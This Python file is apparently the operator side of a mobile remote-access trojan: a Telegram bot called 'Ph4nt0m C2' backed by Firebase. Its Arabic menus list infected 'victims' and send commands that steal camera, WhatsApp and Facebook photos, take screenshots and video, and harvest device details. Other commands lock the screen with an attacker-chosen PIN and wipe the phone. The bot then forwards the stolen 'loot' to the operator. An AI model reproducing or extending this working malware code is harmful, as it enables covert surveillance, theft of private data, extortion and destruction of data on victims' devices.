#!/usr/bin/env python3
"""
Ph4nt0m C2 Bot - Lock PIN Support
"""
import os, json, threading, time, requests, base64
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
from firebase_admin import credentials, initialize_app, db

flask_app = Flask(__name__)
@flask_app.route('/')
def home(): return "System Active"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    flask_app.run(host='0.0.0.0', port=port)

BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]
firebase_creds = os.environ.get("FIREBASE_CREDS")
if firebase_creds:
    cred = credentials.Certificate(json.loads(firebase_creds))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}
LOCK_PIN = {}  # تخزين مؤقت للرمز

def get_online_victims():
    snap = victims_ref.get()
    if not snap: return {}
    return {k:v for k,v in snap.items() if v.get('online')}

async def send_file_to_telegram(update, data_bytes, filename, caption):
    try: await update.message.reply_document(document=data_bytes, filename=filename, caption=caption)
    except: pass

async def send_latest_loot(update, vid):
    loot = db.reference(f'victims/{vid}/loot').get()
    if not loot:
        await update.message.reply_text("لا توجد مسروقات.")
        return
    items = list(loot.items())[-5:]
    for key, item in items:
        typ = item.get('type','?')
        name = item.get('name', typ)
        url = item.get('url')
        info = item.get('info')
        if info:
            await update.message.reply_text(f"📋 **معلومات الجهاز:**\n```{json.dumps(info, indent=2, ensure_ascii=False)}```")
            continue
        if url:
            try:
                r = requests.get(url)
                if r.status_code==200:
                    ext = 'png' if typ in ('screenshot','stealth_photo','photo') else 'webm' if typ=='video' else 'bin'
                    await send_file_to_telegram(update, r.content, f"{name}.{ext}", f"📎 {name}")
            except: pass

def get_victims_keyboard():
    keyboard = []
    for vid, info in get_online_victims().items():
        fg = info.get('fingerprint',{})
        keyboard.append([InlineKeyboardButton(f"🖥 {vid} ({fg.get('plat','?')})", callback_data=f'select_{vid}')])
    keyboard.append([InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims'), InlineKeyboardButton("🗑️ مسح الكل", callback_data='delete_all_victims')])
    return InlineKeyboardMarkup(keyboard)

def get_control_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 سحب الصور", callback_data='photo_menu'), InlineKeyboardButton("📁 سحب الملفات", callback_data='folder_downloads')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'), InlineKeyboardButton("🎥 فيديو 10ث", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'), InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش تشغيل", callback_data='flash_on'), InlineKeyboardButton("💡 فلاش إطفاء", callback_data='flash_off')],
        [InlineKeyboardButton("📋 معلومات الجهاز", callback_data='device_info')],
        [InlineKeyboardButton("🔒 قفل برمز", callback_data='set_pin')],
        [InlineKeyboardButton("💣 فرمتة", callback_data='format'), InlineKeyboardButton("🚫 مسح الجلسة", callback_data='leave')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back_to_victims')]
    ])

def get_photo_folders_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸 الكاميرا", callback_data='folder_camera')],
        [InlineKeyboardButton("📥 التنزيلات", callback_data='folder_downloads')],
        [InlineKeyboardButton("💬 واتساب", callback_data='folder_whatsapp')],
        [InlineKeyboardButton("👤 فيسبوك", callback_data='folder_facebook')],
        [InlineKeyboardButton("🖼️ معرض الصور", callback_data='folder_pictures')],
        [InlineKeyboardButton("📁 جميع المجلدات", callback_data='folder_all')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back_to_control')]
    ])

ASK_PIN = 1

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚡ **Ph4nt0m C2**", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
    ]))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data

    if data in ('show_victims','back_to_victims','refresh_victims'):
        vics = get_online_victims()
        if not vics:
            await query.edit_message_text("لا أجهزة متصلة.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims')]]))
            return
        await query.edit_message_text("اختر جهاز:", reply_markup=get_victims_keyboard())
        if current_victim.get(uid): del current_victim[uid]
        return
    if data == 'delete_all_victims':
        victims_ref.delete()
        if current_victim.get(uid): del current_victim[uid]
        await query.edit_message_text("🗑️ تم مسح الكل.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]]))
        return

    if data.startswith('select_'):
        vid = data.split('_',1)[1]
        if vid not in get_online_victims():
            await query.edit_message_text("غير متصل.", reply_markup=get_victims_keyboard())
            return
        current_victim[uid] = vid
        await query.edit_message_text(f"✅ **{vid}**", reply_markup=get_control_keyboard())
        return

    vid = current_victim.get(uid)
    if not vid:
        await query.edit_message_text("انتهت الجلسة.", reply_markup=get_victims_keyboard())
        return

    if data == 'leave':
        victims_ref.child(vid).delete()
        if current_victim.get(uid)==vid: del current_victim[uid]
        await query.edit_message_text("🚫 تم المسح.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]]))
        return

    if data == 'set_pin':
        await query.edit_message_text("🔢 أرسل رمز PIN من 4 أرقام:")
        return ASK_PIN

    if data == 'photo_menu':
        await query.edit_message_text("اختر مجلد:", reply_markup=get_photo_folders_keyboard())
        return
    if data.startswith('folder_'):
        key = data.split('_',1)[1]
        cmd = {"action":"get_photos"} if key=='all' else {"action":"get_photos","folder":key}
        db.reference(f'victims/{vid}/command').set(cmd)
        await query.edit_message_text(f"✅ جاري السحب...", reply_markup=get_control_keyboard())
        time.sleep(3)
        await send_latest_loot(query, vid)
        return
    if data == 'back_to_control':
        await query.edit_message_text("لوحة التحكم:", reply_markup=get_control_keyboard())
        return

    if data == 'device_info':
        db.reference(f'victims/{vid}/command').set({"action":"device_info"})
        await query.edit_message_text("✅ جاري جمع المعلومات...", reply_markup=get_control_keyboard())
        time.sleep(2)
        await send_latest_loot(query, vid)
        return

    params = {}
    if data == 'vibrate': params['duration'] = 5000
    elif data == 'record_video': params['duration'] = 10
    db.reference(f'victims/{vid}/command').set({"action":data, **params})
    await query.edit_message_text(f"✅ تم: {data}", reply_markup=get_control_keyboard())
    if data in ('screenshot','folder_downloads'):
        time.sleep(3)
        await send_latest_loot(query, vid)

async def receive_pin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.message.from_user.id
    pin = update.message.text.strip()
    if len(pin)!=4 or not pin.isdigit():
        await update.message.reply_text("❌ يجب أن يكون PIN مكوناً من 4 أرقام. أعد المحاولة.")
        return ASK_PIN
    vid = current_victim.get(uid)
    if not vid:
        await update.message.reply_text("انتهت الجلسة.")
        return ConversationHandler.END
    db.reference(f'victims/{vid}/command').set({"action":"lock_screen","pin":pin})
    await update.message.reply_text(f"🔒 تم إرسال أمر القفل بالرمز: {pin}")
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern='^set_pin$')],
        states={ASK_PIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_pin)]},
        fallbacks=[]
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(conv_handler)
    print("🤖 Ph4nt0m Bot Started...")
    app.run_polling()

if __name__=="__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    main()
